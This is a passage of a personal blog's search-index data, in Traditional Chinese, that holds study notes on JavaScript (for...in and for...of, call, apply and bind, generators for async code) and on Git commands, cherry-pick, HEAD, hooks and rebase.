2, 3, 4, 5, 6} for…in 的幾個特點 會輸出在陣列中新增的 key 123456789101112const arr = [1, 2, 3, 4, 5]// 對 arr 建立新的 keyarr.myKey = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'myKey'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} for...of 會按照 arr[0], arr[1]... 這樣的順序去迭代，所以不會迭代到 arr['myKey'] 這個值，也就沒辦法輸出 'hello' 了。 會輸出從原型鏈中繼承的屬性 123456789101112const arr = [1, 2, 3, 4, 5]// 在 Array 的 prototype 中新增屬性Array.prototype.myProperty = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'hello'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} 這裡談的 prototype 是指我們自己額外新增的才算數，不包含原本內建的。 123456789101112const arr = [1, 2, 3, 4, 5]// 在 Object 的 prototype 中新增屬性Object.prototype.myProperty = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'hello'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} 既然是原型鏈，那只要能夠在原型鏈中的 prototype 找到的屬性都能算數。不過範圍跟剛才一樣，僅限於我們另外新增的才算數。 for…of 並不能迭代物件的值前面有提到 for...of 是按照 arr[0], arr[1]... 這樣的順序來迭代出 value。所以當 for..of 的對象是物件（Object）的話，會拋出一個錯誤跟你說：「這是一個沒辦法迭代的對象」 12345678910const me = { name: 'Jim', age: 20, position: 'engineer'}// Uncaught TypeError: me is not iterablefor(let value of me) { console.log(value)} 雖然 for..of 本身無法做到，但可以搭配 Object.keys() 來取出物件中的值。 12345678910const me = { name: 'Jim', age: 20, position: 'engineer'}// Object.keys 會回傳一個包含所有 key 的陣列for(let value of Object.keys(me)) { console.log(me[value])} 這裡的小巧思就是，for...of 的對象仍然是陣列（Array），但這個陣列包含了所有我們需要的 key 值，利用它就能取出物件中的每個值。","link":"/2022/01/07/for-in-and-for-of/"},{"title":"function 中的 call apply bind","text":"該來的還是得來。 簡述呼叫 function 有三種方法： 用括號 () 用 call 用 apply () 就是你常用的，所以不多做介紹，只會介紹 call 跟 apply 這兩個。 另外 bind 不是用來呼叫 function，是用來綁定 this 值的一種 method，並回傳一個新的 function。 跟 this 值有關的一些懶人包： 嚴格模式下，不是在物件裡的 this 值都是 undefined 非嚴格模式下，不是在物件裡的 this 值是 window / global（瀏覽器 / Node.js） 非嚴格模式下，用 call apply bind 傳入的 primitive 都會被轉成 object 如果傳 null undefined，非嚴格模式一律等於 window / global，嚴格等於 null undefined call 的用法1234function hello(a, b) { console.log(a + b)}hello.call(null, 5, 10); // 15 第一個值是設定 this 值，待會再討論，第二個參數就是 function 中的參數了。 this 值要注意是不是「嚴格模式」： 在嚴格下，傳什麼就是什麼，傳 null, undefined 就會得到 null, undefined 在非嚴格下，傳進去 null undefined 會得到 global / window，而 primitive 都會變成 Object。 123456789'use strict';function hello(a, b) { console.log(this, a + b) }hello.call(null, 5, 10); // null, 15hello.call(undefined, 5, 10); // undefined, 15hello.call('yoyoyo', 5, 10); // yoyoyo, 15hello.call(1010, 5, 10); // 1010, 15 1234567function hello(a, b) { console.log(this, a + b) }hello.call(null, 5, 10); // window / global, 15hello.call(undefined, 5, 10); // window / global, 15hello.call('yoyoyo', 5, 10); // {String: yoyoyo}, 15hello.call(1010, 5, 10); // {Number: 1010}, 15 apply 的用法其實就跟 call 一模一樣，差別在於參數是用 Array 來傳入： 1234function hello(a, b) { console.log(a + b) }hello.apply(null, [10, 5]) // 15 一樣可以改 this 值，注意一下嚴格與非嚴格就好： 123456789'use strict';function hello(a, b) { console.log(this, a + b) }hello.apply(null, [10, 5]) // null, 15hello.apply(undefined, [10, 5]) // undefined, 15hello.apply('yoyoyo', [10, 5]) // yoyoyo, 15hello.apply(1010, [10, 5]) // 1010, 15 1234567function hello(a, b) { console.log(this, a + b) }hello.apply(null, [10, 5]) // window / global , 15hello.apply(undefined, [10, 5]) // window / global, 15hello.apply('yoyoyo', [10, 5]) // {String: yoyoyo}, 15hello.apply(1010, [10, 5]) // {Number: 1010}, 15 bind 的用法前面有說過它是用來綁定 this 值的 method，因為是「綁定」，所以你就算之後再用 call 或 apply 也不會改變。 備註：用 bind 會回傳一個新的 function（綁定好 this 值再回傳） 123456789'use strict'function hello() { console.log(this)}hello() // undefinedlet newFunction = hello.bind('yo')newFunction() // yo 1234567function hello() { console.log(this)}hello() // window / globallet newFunction = hello.bind('yo') newFunction() // {String: yo} 總之呢，你傳入的 this 值會根據嚴格或非嚴格模式定義，忘記的話就回去複習上面的例子。","link":"/2022/02/01/function-call-apply-bind/"},{"title":"函式的宣告方式","text":"如題。 除了這種方式以外： 123function hello() { console.log('hello')} 也可以這樣宣告： 123var hello = function() { console.log('hello')} 還記得 function 其實也是一種「資料型態」嗎？所以把它儲存到一個變數裡面也是很合理的事情，對吧？","link":"/2021/12/18/function-define-method/"},{"title":"函式填空法","text":"經典的作法。 把大事情拆成小事情如果你不知道某些東西的細節該怎麼實作，一個最直覺的方式就是「先寫 function 來填空」。 例如說題目是：印出 1 ~ 100 中的奇數。 如果沒辦法直接想出每一步要怎麼寫，那你可以先把事情大事情拆成小事情： 印出 1 ~ 100 把是奇數的數給 log 出來 所以這邊就可以用兩個 function 來填空： print1to100() logOdd() 接下來就一步一步實作： 12345function print1to100 () { for(var i=1; i&lt;=100; i++) { console.log(i) }} 1 ~ 100 的部分沒問題了，接著要來處理奇數的部分，所以可以把 console.log(i) 這個部分改用另外一個 function 填進來： 12345function print1to100 () { for(var i=1; i&lt;=100; i++) { logOdd(i) }} 既然雛形已經有了，接下來就是動腦實作囉： 12345function logOdd(number) { if (number &amp; 1) { console.log(number) }} TA～DA！這樣就做完囉。 題外話其實這是個蠻實用的做法的，但我有時候會忘記這個方式，所以想寫下來提醒自己。","link":"/2021/12/18/function-fill-method/"},{"title":"function 的回傳值","text":"簡短紀錄一下。 function 的預設回傳值如果一個 function 裡面沒有用 return 來回傳一個值，那預設就會回傳 undefined。 大多數的情況都會讓 function 有一個回傳值，這樣是比較正確的做法，請保持這個良好的習慣。 沒有回傳值的範例1234function sayHello() { console.log('hello')}console.log(sayHello()) 結果： 12'hello'undefined 有回傳值的範例1234function sayHello() { return 'hello'}console.log(sayHello()) 結果： 1'hello'","link":"/2021/12/20/function-return-value/"},{"title":"從 Callback 到 Promise 再到 Generator","text":"很有意思的寫法。 簡述這篇是繼 快速入門 generator 的延伸文章，主要是想介紹一下用 generator 來實現非同步操作是怎麼樣的感覺。 範例這邊我們先從 callback 開始，我們要做的事情很簡單，就是模擬打三隻 API，分別是以下幾個 1. 文章列表 1234567891011121314const posts = [ { postId: 1, title: 'post1', }, { postid: 2, title: 'post2' }, { postid: 3, title: 'post3' }] 2. 文章資訊 1234567891011121314151617const postInfo = [ { authorId: 1, content: 'content', createdAt: '2022-05-06' }, { authorId: 2, content: 'content', createdAt: '2022-05-07' }, { authorId: 3, content: 'content', createdAt: '2022-05-08' }] 3. 作者資訊 1234567891011121314151617const authors = [ { id: 1, name: \"PeaNu\", email: \"jimdevelopesite@gmail.com\", }, { id: 2, name: \"Garry\", email: \"garrylovecook@gmail.com\", }, { id: 3, name: \"PPB\", email: \"ppbissuperman@gmail.com\", }] 順序的話就是： 從文章列表中取得文章 id，再用 id 查文章資訊 從文章資訊中取得作者 id，再用 id 查作者 拿到作者的名字 所以等一下會從 callback 介紹到 Promise，再介紹到 generator 三種不同的方式。 順道一提，因為是假資料，所以會用 setTimeout 來模擬非同步。 callback12345678910111213141516171819function getPosts (callback) { setTimeout(() =&gt; callback(posts), 1000)}function getPostInfo (id, callback) { setTimeout(() =&gt; callback(postInfo.find(item =&gt; item.authorId === id)), 1000)}function getAuthor (id, callback) { setTimeout(() =&gt; callback(authors.find(item =&gt; item.id === id)), 1000)}getPosts(posts =&gt; { getPostInfo(posts[0].postId, post =&gt; { getAuthor(post.authorId, author =&gt; { console.log(author.name); }) })}) 俗稱的 callback hell，不過 JS 寫久以後就會覺得逐漸麻痺了，雖然真的蠻醜的。 Promise12345678910111213141516171819202122function getPosts () { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(posts), 1000) })}function getPostInfo (id) { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(postInfo.find(item =&gt; item.authorId === id)), 1000) })}function getAuthor (id) { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(authors.find(item =&gt; item.id === id)), 1000) })}getPosts().then(posts =&gt; getPostInfo(posts[0].postId)).then(post =&gt; getAuthor(post.authorId)).then(author =&gt; console.log(author.name)) 改用 return Promise 的方式來包裝，接著就可以用 then 來處理，避免了 callback hell 的問題。 generator接著是重頭戲了，先來看 code： 1234567891011121314151617// 上面維持剛剛的 Promise，所以就不寫出來了function* getResult () { const posts = yield getPosts(); const post = yield getPostInfo(posts[0].postId); const author = yield getAuthor(post.authorId); console.log(author);}const iterable = getResult();iterable.next().value.then(posts =&gt; { iterable.next(posts).value.then(post =&gt; { iterable.next(post).value.then(author =&gt; { iterable.next(author); console.log('done') }) })}) 這邊只要理解下面那一段，就會知道為什麼可以這樣寫了，所以來一步一步看吧： iterable.next() 這邊會跑到第一個 yield getPosts()，所以可以用 .then 拿到文章列表。 iterable.next(posts) 記得以前說的嗎？在 next 裡面傳參數就代表「把上一個 yield 的值改寫掉」，所以 const posts = response。 接著因為 posts 有值了，所以 yield 後面的 getPostInfo(posts[0].postId) 就可以繼續往下執行。 iterable.next(post) 跟剛剛一樣，把 post 寫到上一個 yield，所以 const post = response，後面的 yield getAuthor(post.authorId) 正常跑。 iterable.next(author) 這邊也一樣，會把 author 的寫到上一個 yield，所以 const author = response。 接著就繼續往下執行到 console.log(author)，這時候因為上一行已經賦值了，所以就可以印出最後的結果。 這一段如果看不懂的話就重新思考 next(params) 的作用是什麼？然後一步一步照著程式來跑就會理解一些了。 總之這邊只是想示範一下用 generator 來實作非同步是什麼樣的感覺。 再更進階一點剛剛的部分其實還可以再做個優化，畢竟要一直用 iterable.next 的話在某種意義上也有點 callback hell 的感覺，所以其實可以改寫成「遞迴」的形式： 123456789101112131415161718function* getResult () { const posts = yield getPosts(); const post = yield getPostInfo(posts[0].postId); const author = yield getAuthor(post.authorId); console.log(author);}function run () { const iterable = getResult(); function go (result) { // 只要 done 不是 true 就一直遞迴 if (result.done) return result.value.then(res =&gt; go(iterable.next(res))) } go(iterable.next())}run(); 這樣就有一個自動化的 function 來幫你跑 generator 了，是不是有一點 async/awiat 的感覺？也許這背後就是用這種方式來實作的也說不定。 總之，以上就是 generator 的示範，希望我能越來越熟悉這玩意兒。","link":"/2022/05/19/generator-with-async/"},{"title":"Git bash 上的快捷鍵","text":"就只是快捷鍵。 你以為是 Ctrl + C 和 Ctrl + V Ctrl + A + K 刪除整行文字 insert 貼上複製的內容 Ctrl + insert 複製選取內容 其他 Ctrl + L 清除所有內容","link":"/2021/12/13/git-bash-shortcut/"},{"title":"Git Cherry-pick－只把想要的 commit 併進來","text":"很神奇的功能。 簡述假設這是目前的紀錄： 我現在位於 master 上，然後有 dog 和 cat 這兩個分支。現在我想要把 cat 的內容合併到 master，可是我只想要其中幾個 commit，不想要全部都併進去。 例如我只想要 add cat1 這筆紀錄的話，可以下這段指令： 1git cherry-pick 1006eb2 這樣 master 就只會多出 add cat1 的紀錄： 不要幫我 commit有時候你可能想額外加一些東西，所以不希望一下完指令後就直接 commit 出去，這時候可以加上 --no-commit： 1git cherry-pick 1006eb2 --no-commit 這樣子資料就會被放到「暫存區（Stage Area）」，等到全部修改完成後再自己 commit 就行囉。 對 cherry-pick 的誤解我剛開始學這個指令的時後發現我對它背後的含義有一點誤解，所以特別寫這一段來解釋一下。 先回憶一下剛剛的範例： 在前面的示範中我們是從 cat 中取出 add cat1 的記錄到 master 中，不過如果現在是取出 add cat3 呢？ 1git cherry-pick 63eeaa5 出來的結果就會變這樣子： 看起來沒什麼問題啊？怎麼了嗎？ 單從歷史紀錄來看的話確實是沒有什麼問題，但其實 cherry-pick 並不是幫你把 add cat3 給抓出來，而是把 add cat3 給合併。 這樣子說可能聽不懂，所以我們來看一下 add cat3 修改了什麼： add cat3 只有新一行 Cat3 而已，接著來看一下併完後的 master： 注意到了嗎？最後的內容並不是只有 add cat3 當下所做的改變，而是這個 commit 當下的所有檔案內容，換句話說就是整個合併進來。 所以這就跟我原本想的不太一樣，我以為它只會把「修改的內容」給抓出來而已，但實際上的意思是： 選擇我想要 merge 的位置，並且留下這個位置的 commit 訊息。 我舉幾個例子（這邊為了方便閱讀就不寫 hash 值了）： 1git cherry-pick 'add cat1' 意思是「把 add cat1 合併到 master，但只留下 add cat1 的提交紀錄」 1git cherry-pick 'add cat2' 意思是「把 add cat2 合併到 master，但只留下 add cat2 的提交紀錄」 1git cherry-pick 'add cat3' 意思是「把 add cat3 合併到 master，但只留下 add cat3 的提交紀錄」 你可以把上面這幾個範例想成這樣： 123git merge 'add cat1' // 合併，但只保留 add cat1 的 commit 紀錄git merge 'add cat2' // 合併，但只保留 add cat2 的 commit 紀錄git merge 'add cat3' // 合併，但只保留 add cat3 的 commit 紀錄 總之你一定要記得： cherry-pick 只是用另一種方式來做 merge cherry-pick 只是用另一種方式來做 merge cherry-pick 只是用另一種方式來做 merge 不管你選擇的位置是哪裡，只要想成你是在做 merge 就好了，跟那個 commit 修改的內容一點關係也沒有。 那什麼時候該用 cherry-pick？如果有聽懂剛剛的解釋，就能理解 cherry-pick 比較像是「可以自由選擇 commit 紀錄的 merge」，而不是把你想要的修改內容抽出來，所以比較正確的用法大概會是像這樣，一樣是剛剛的例子： 1git cherry-pick 63eeaa5 -x 這邊把 add cat3 合併進來並加上 -x，-x 是用來讓 Git 自動幫我們產生「標準訊息」。 附註：因為 cherry-pick 併完後不會額外產生新的 commit，所以不仔細看的話可能不會知道這份紀錄是併過來的，所以才建議在 commit 內容中加上額外的訊息。 最後完成的結果就會像這樣： 就跟剛剛說的一樣，這裡實際上是幫你合併所有在 cat 中的所有修改，但只有保留 add cat3 的 commit 紀錄。順道一提這段 commit 訊息應該要修改成 add cat1 ~ 3 才比較符合這個 commit 實際上做的事情，但這邊只是為了示範所以就沒特別做了。 總之用 cherry-pick 其實只是令外一種合併方式而已，它可以讓你很輕鬆的拿掉不必要的 commit 紀錄。 如果要用 merge 來產出相同的結果，步驟就會變比較麻煩： 1git merge 63eeaa5 1git reset HEAD~3 // 取消最後 3 筆 commit 紀錄（但保留檔案） 1git commit -am 'add cat3' // 加入暫存區並提交 所以兩種方法其實都行，端看你喜歡哪一種而已。","link":"/2022/10/14/git-cherry-pick/"},{"title":"Git 設定個人資訊","text":"第一次碰到這問題。 簡述進了公司後我才碰到這個問題，就是公司的專案在使用 git 時通常會設定公司的信箱及名稱，可是有時會希望自己的專案上可以用個人的設定，這時候就可以用下面的方法來調。 還蠻簡單的，只要進入到自己的專案目錄底下直接設定： 12git config user.name \"your name\"git config user.emai; \"your email\" 這樣就會對專案底下的 .git 新增相關的 config，只要在這個專案的範圍都會以這邊的 config 為主。 順道一提，如果要修改全域設定的話，可以這樣做： 12git config --global user.name \"your name\"git config --global user.emai; \"your email\"","link":"/2022/05/11/git-config-setting/"},{"title":"Git－HEAD","text":"不確定什麼時候會用到，但記下來就對了。 絕對位置我們除了在不同分支上工作以外，有時候也會需要切換到「指定的 commit」（例如要做 rollback 的時候），這個時候可能就會需要「切換 HEAD」的位置。 假設目前的紀錄長這樣： 在我們沒有去刻意移動 HEAD 的情況下，它通常會指向目前的所在分支（main） 現在我們可以用下面的指令來把 HEAD 移動到 C1 這個「commit」上： 1git checkout C1 執行完的結果如下： 雖然位置看起來是一樣的，不過差別在於一個指向的是「分支」， 一個則是「Commit」。 這種透過 Hash 值來移動的方式是「絕對位置」，等一下會介紹怎麼用「相對位置」的方式來做移動。 相對位置除了直接指定 Hash 值以外，我們也可以利用 HEAD^ 或 HEAD~&lt;num&gt; 的方式來根據目前的位置來移動 HEAD。 例如說底下的這筆紀錄： 目前我們位於 main 分支上，現在如果想把 HEAD 移動到 C0 的位置，可以用兩種不同方式來達成。 第一種： 12git checkout HEAD^ // 移動到 C1git checkout HEAD^ // 移動到 C0 第二種： 1git checkout HEAD~2 我覺得這邊比較重要的是「相對位置」的概念，不論你是喜歡用 HEAD^ 還是 HEAD~，它們都一定是基於某一點來做移動，這才是比較核心的概念。 絕對位置 + 相對位置合在一起使用絕對跟相對其實是可以一起使用的，直接來看範例會比較好理解一點。 假設這是目前的紀錄： HEAD 現在位於 main 分支上，如果我想要移動到 C3 的位置的話可以怎麼做？ 如果是用絕對位置的方式的話： 1git checkout C3 或者是相對位置的話： 12git checkout bugFix // 先切換分支git checkout HEAD^ // 往前一動一個 commit 或是乾脆一點，直接混再一起用： 1git checkout bugFix^ // 切換到 bugFix 的前一個 commit 總而言之切換 HEAD 的方式有很多種，這邊只是想提醒一下混用的功能，我覺得這還蠻新奇的。 移動分支的 commit 位置這個我目前還不確定它的實際用途，不過第一次知道有這個功能所以就順便記錄一下吧。 簡單來說除了移動 HEAD 以外，我們還可以直接把分支移動到某一個 commit 上，這樣子說有點抽象，所以一樣來看圖吧。 假設這是目前的紀錄： 如果我想要移動 bugFix 這整個分支的位置的話，我可以這樣做： 1git branch -f bugFix C3 附註：這邊的指令是 git branch -f &lt;分支名稱&gt; &lt;要移動到的位置&gt; 執行完的結果如下： 這樣子就可以把 bugFix 從原本的 C5 移動到 C3 的位置了。","link":"/2022/10/04/git-head/"},{"title":"Git hook","text":"好像走到哪裡，晃到哪裡，都有 hook 這個東西。 關於 hookhook 的直翻是「鉤子」。但在程式的世界裡，你可以把它想像成是釣魚的那個鉤子，當有魚上鉤的時候，鉤子就會有「反應」。 這個反應就是用來通知我們「某件事情發生了」的意思。 以 Git 來說的話，可以是： 有人 commit 的時候通知我 有人 push 的時候通知我 Git 中的 hook這些 hook 都放在 .git 裡面的 hooks 資料夾。 每個 hook 都會在特定的時機被觸發，例如說「pre-commit」這個 hook 會在「commit 之前被觸發」。 你可以利用這個 hook 來寫一段 shell script（當成是一種寫好的腳本就好）做控制，讓只有通過檢查的 commit 才會真的送出去。 exit 0，代表成功，會執行 exit 1，代表失敗，不會執行 如果你學過 C 語言，你可以用 C 語言會用 「return 0」來代表執行正確的概念來幫助記憶。 （我目前還不會寫 shell script，但現在只要知道 Git 有 hook 這個東西可以用就好了，以後有需要的時候自然就會去查資料了。） 參考資料使用 Git Hooks 紀錄不同專案的 commit 訊息","link":"/2021/12/13/git-hook/"},{"title":"Git 指令","text":"把一些會用到的指令都紀錄在這裡。 幫助你理解的小提示Git 把檔案分成兩種： Untracked 不加入版本控制（可想成是代表「檔案還沒被放到資料夾」裡面） Staged 加入版本控制（可想成是代表「檔案已經放到資料夾」裡面了） 設定縮寫123git config --global alias.co checkoutgit config --global alias.br branchgit config --global alias.st status 如果想刪除的話可以到 ~/.gitconfig 中做修改。 基本指令git init，初始化。初始化後 Git 就會知道我們要對這個專案做版本控制 .gitignore ，要忽略的檔案（不要加入版控的檔案）。它自己也應該要加到版控裡面，這樣別人才知道有哪些檔案被忽略。 git status，查看目前的狀態 git add，把檔案加入版本控制（每一次都要做的動作。可想成是把檔案放到 temp 資料夾）git add .，把目前資料夾底下所有檔案都加入版本控制 git rm --cached，我現在又不想要對 xx 檔案做版本控制（從 Staged 變成 Untracked） git commit，新建一個版本（可想成是「用亂數幫資料夾命名」的動作，代表這個版本建立完成。）git commit -am，一個快速提交的方法。可以同時執行加入版本控制與提交的動作。但要注意，這不適用於「新建立的檔案」，換句話說就是「只有被更改或刪除的檔案」才適用） git restore，不要保留更新的內容 git log，查看歷史紀錄（你建立了幾個版本）git log --oneline，比較簡短的資訊（內容太長會被 terminal 腰斬） git reflog 查看 HEAD 經過的每個版本，可以利用這個來查詢所有的 commit 紀錄（HEAD 只要走過，必留痕跡）git reflog --grep-reflog=&lt;patter&gt; 用關鍵字來搜尋 git checkout，回到某一個版本（切換到某個資料夾）。要切換版本時，可以指定每個版本號碼的前 7 碼就行了（因為也很難重複） git checkout master，回到 master 這個分支的最新版本（注意是 master 這個分支的最新版） git diff，看這一次跟上一次的差別。如果沒有指定檔案的話會顯示所有被更新的檔案（注意，只有「在 commit 之前」才可以查看。） 分支指令git branch -v，查看目前 Git 中的所有分支，參數 -v 是附上每條分支的 HEAD 所在版本 git branch &lt;branch-name&gt;，建立新的分支 git branch -d &lt;branch-name&gt;，刪除分支 git branch -m &lt;new-name&gt; 更新分支名稱 git checkout &lt;branch-name&gt;，切換到哪個分支（就跟切換 commit 版本的概念一樣） git checkout -b &lt;branch-name&gt; 建立分支後直接切換過去 git merge &lt;branch-name&gt;，把 xx 分支「合併進來」。 關於合併的觀念做個補充。如果單看合併這個字，你可能會搞不太清楚意思。 假設現在有兩個分支，master 跟 new-feature，而你人在 master 分支上。那合併可能會有兩種情況： 把 master「合併出去」 把 new-feature「合併進來」 而 git merge 實際上是採用第二種作法，也就是「合併進來」，所以 master 會把 new-feature 合併進來。 進階指令git merge &lt;branch&gt; 合併分支 git rebase &lt;base&gt; &lt;merged branch&gt; 合併 git rebase -i &lt;基準點&gt; 使用互動模式來更改歷史紀魯 遠端指令git remote add origin https://github.com/，新增遠端的 repository，這邊是建一個叫做「origin」的遠端（你也可以取其它名字，但是簡單的事情，不要搞得太複雜）。 至於連結的部分是用來表示 origin 這個遠端 repository 的「位置」（畢竟它不是你本機的東西，所以你總要告訴 Git 你要把它放在哪裡吧）。 git push origin master，把「本地端」的 master 推到 origin 上並建立 master 分支（遠端）git push origin master:cat，把「本地端」的 master 推到 origin 並建立 cat 分支（遠端）git push orign :cat 把「遠端」的 cat 分支移除 git pull origin master，把「origin」的 master 拉下來，跟目前我所在的分支內容同步 關於 push 跟 pull 要注意兩件事： 搞清楚 push 跟 pull 的差別： push 的 master 是指「本地端的 master」，pull 的 master 是指「遠端的 master」 如果 pull 下來的檔案跟本地的檔案有修改到同樣的內容，那也會發生 Conflict。（可以把 pull 想成是把遠端的 master 跟本地的 master 做合併，提到合併，就會有可能引發 Conflict） push 可以指定你要 push 哪一個分支到遠端，所以你不一定要在那個分支上才能 push，但是 pull 一定要在你要同步的那個分支上。 參考資料Git 教學：如何 Push 上傳到 GitHub？連猴子都能懂的 Git 入門指南","link":"/2021/12/13/git-instruction/"},{"title":"Git Rebase－在過去的 commit 中插入新的 commit","text":"像在改寫歷史一樣。 簡述假設這是目前的紀錄： 附註：這邊是故意用比較複雜的紀錄來當範例，後面會解釋原因。 現在我想要在 B 和 C 之間插入新的 commit 紀錄，那一樣可以用 rebase 的方式來做，作法會跟 Git Rebase－把單個 commit 拆成多個 commit 有點類似，流程會是： 使用 rebase edit 功能來停留在 B 這個紀錄點 接著改寫 B 以後的 commit 紀錄 原本拆 commit 時是改寫 B 自己的紀錄，現在只是改成在 B 以後新增其他筆紀錄而已，所以接著來直接下指令吧！ 1git rebase -i HEAD~7 // 進入 HEAD ~ 第一個 commit 位置的 rebase 進入互動模式，把 B 設為 edit： 存檔以後離開，Git 就會自動停在 B 的紀錄點： 123456789pick e4359cf F停止在 9451156... B您現在可以修補這個提交，使用 git commit --amend dc4737 到 6ea94ba（7 個提交）#當您對變更感到滿意，執行# p, pick &lt;提交&gt; = 使用提交 git rebase --continue用提交，但編輯提交說明 這時候就可以在這裡建立其他的 commit 紀錄： 12git commit -am 'other1' // 第一筆新的 commitgit commit -am 'other2' // 第二筆新的 commit 新增完的狀態會像這樣： 雖然目前看起來有點亂，不過等一下完成後就會比較正常了。 結束 rebase： 1git rebase --continue 附註：因為是改寫以前的紀錄，所以這邊有很大的機率會出現 conflict，這部分在自行處理掉即可。 完成後的結果如下： 因為這邊比較亂所以有特別框起來標注，可以看到 master 上（粉色框框）的紀錄在 B 以後多了 other1 和 other2 的新紀錄（紅色框框），就跟我們想要的結果是一樣的。 而這邊故意用了一個比較複雜的範例是有原因的，我想讓你明白如果去改寫前面的紀錄，會對其他的分支造成什麼影響？ 仔細想想看我們剛剛的行為，如果我們真的改寫了過去，那直覺來說也會影響到 cat 和 dog 這兩個從 master 長出去的分支。 可是如果真的是這樣的話會有點困擾，就跟蝴蝶效應一樣，改了 A 就連帶影響到 B 。所以 Git 很聰明，它會讓原本的分支繼續停留在原本的歷史紀錄，而不會直接放到新歷史紀錄上。 換句話說就是當你切換到 cat 或 dog 時是不會看到 other1 和 other2 這個紀錄的。 總之這就是回到過去新增 commit 的方式，相信我在未來的某些場景下會用到這個功能。","link":"/2022/10/10/git-rebase-insert-commit/"},{"title":"Git Rebase－以前做了一點修改，想合併到目前的紀錄","text":"工作時碰到的狀況。 簡述這是我在工作時碰到的一個問題，就是我習慣在完成目前進度以後回頭去重構一些以前的 code。這件事本身沒什麼問題，有問題的地方是： 有時後重構的部分只完成了一半，所以不想要直接合併到目前的進度裡並推到遠端上。 這時候就會產生這樣的紀錄： 假設我原本在 E 的時候重構了一部分的 code，但當時沒有還提交上去，所以這一段進度就會停留在舊的歷史紀錄上。 接著到我下次完成進度（假設是 cat）繼續重構以後，用 merge 來合併到目前的進度時就會變成這樣子： 老實說就這樣直接推到遠端上也沒什麼問題，只是如果你跟我一樣有一點「潔癖」的話，應該會覺得能用更優雅的方式來處理幾個問題： reconstruct 上的 commit 紀錄應該能合併成一筆（畢竟 partial change 這個 commit 只是當時用來暫存的段落，不然它本身沒有實際意義） reconstruct 可以直接用 rebase 接到 cat 後面，就不會看起來拉了一條很長的線出來（這個完全是喜好問題 XD） 所以來重頭開始吧！ 先來改寫 reconstruct 的 commit 紀錄： 12git reset HEAD~2 // 收回所有的 commitgit commit -am 'reconstruct code' // 重新建立 commit 紀錄 接著用 rebase 把 reconstruct 接到 cat 後面： 1git rebase cat reconstruct 附註：如果看不懂這段指令的話可以去複習 Git Rebase－合併分支 最後就得到了一個乾淨許多的新紀錄： 總而言之，不管想用 merge 還是 rebase 來合併都可以，因為最後併出來的內容都是相同的，主要只是差在歷史紀錄看起來不太一樣，不過我個人還是偏好 rebase 的方式就是了。","link":"/2022/10/13/git-rebase-merge-previous-change/"},{"title":"Git Rebase－合併分支","text":"學會以後會覺得它很好用。 簡述在使用 rebase 以前我們先來看一下一般的 merge 是怎麼併的。 假設目前的紀錄長這樣： 接著我們在 cat 分支執行： 1git merge dog // 把 dog 合併到 cat 解除完 conflict（如果有）以後的結果如下： 好，這就是我們熟知的 merge，但為什麼要特別提這個？這是因為等一下要介紹的 rebase 合併完的結果會跟現在不太一樣。 現在讓我們改用 rebase 來合併剛剛的 cat 和 dog 分支（一樣是在 cat 分支）： 1git rebase dog cat 這段指令的意思是 git rebase &lt;基準點&gt; &lt;被複製的人&gt;，不過你應該比較常看到 git rebase dog 的寫法，因為 git 會把 &lt;被複製的人&gt; 自動帶入目前所在的分支。 至於 &lt;基準點&gt; 跟 &lt;被複製的人&gt; 是什麼意思待會再解釋，我們先看一下 rebase 後的結果會長什麼樣： 在 merge 的時候會自動幫我們產生一個新的 commit 來表示「合併」這件事，可是在 rebase 的時候就沒有這個行為了，看起來就好像直接「把 cat 接到 dog 上面一樣」的感覺。 除了最後的結果長的不太一樣以外，「合併」這件事本身是相同的，所以要用哪一種方式來合併都是可以的。 rebase 背後做了什麼？前面有提到在使用 rebase 指令時會設定 &lt;基準點&gt; 和 &lt;被複製的人&gt; 這兩個不同的「對象」，所以這到底是什麼？ 簡單來說，回憶一下剛剛的例子，我們在用 rebase 做合併時大概做了這幾件事： 複製一份 cat 身上的 commit 紀錄（建立新的 hash 值） 把複製過來的紀錄「接」到 dog 的最後一筆 commit 上 完成 rebase 因為會有「複製」這個動作，所以 &lt;被複製的人&gt; 就是在指你要複製哪一個分支的 commit 紀錄？而複製完以後要再「接到某個分支上」，所以 &lt;基準點&gt; 就是在指要被接上去的那個分支是誰？ 這個是我自己的理解方式，如果要看更詳細的說明可以看這篇。 所以剛剛的範例如果改成： 1git rebase cat dog 出來的結果就會變成： 因為 &lt;基準點&gt; 和 &lt;被複製的人&gt; 交換了，所以出來的結果也會不一樣，所以我覺得在使用 rebase 的時候只要搞清楚這兩個角色就不會有太多疑惑了。 順道一提，這兩個詞只是我自己發明的，如果出去外面這樣跟別人說的話別人可能會滿臉問號。 怎麼取消 rebase 後的結果一樣是剛剛的範例，假設這是 rebase 後的結果： 現在會碰到的問題是，如果想要跳回「還沒有 rebase 前」的狀態該怎麼做？你可能會想說： 啊就直接用 reset HEAD^ --hard 不行嗎？」 答案是不行，這樣子只會回到前一個 commit 紀錄而已： 這是因為 rebase 不像 merge 會自動幫我們另外產生一個新的 commit 紀錄，所以你就算想用 reset 回到前一筆紀錄，這筆紀錄也不會是「做 rebase 之前」的那一筆。 這時候有兩種方法： 用 reflog 找到 rebase 以前的 commit 紀錄 用 ORIG_HEAD 回到上一個「危險操作」以前的位置 這邊先來看第一種，首先下 git reflog 來查看歷史紀錄： 附註：這邊我有重寫過紀錄，所以才不會有剛剛的 reset 紀錄 紅色框起來的部分都是跟 rebase 相關的操作，所以我們只要回到這之前的紀錄就行了。 撇除掉 rebase 後的最新紀錄是 add cat2（138f72c），這個就是我們要的了，所以可以下： 1git reset 138f72c --hard 這樣子就能回到 rebase 前的狀態囉： 接著是第二種方式，這個只要直接下： 1git reset ORIG_HEAD --hard 一樣也能回到 rebase 前的狀態： 很神奇吧！這是因為 ORIG_HEAD 是 Git 中比較特別的紀錄點，它會自動記住上一次「合併分支」、「Reset」或是「Rebase」這些比較危險的操作，也因為這樣所以才會稱為「危險操作」，所以如果你懶的用 reflog 去查 hash 值的話就可以直接用這個方式來 reset，會更方便一些。 總之這兩種方法都是 OK 的，挑一個你喜歡的來用就行了。","link":"/2022/10/05/git-rebase-merge/"},{"title":"Git Rebase－把單個 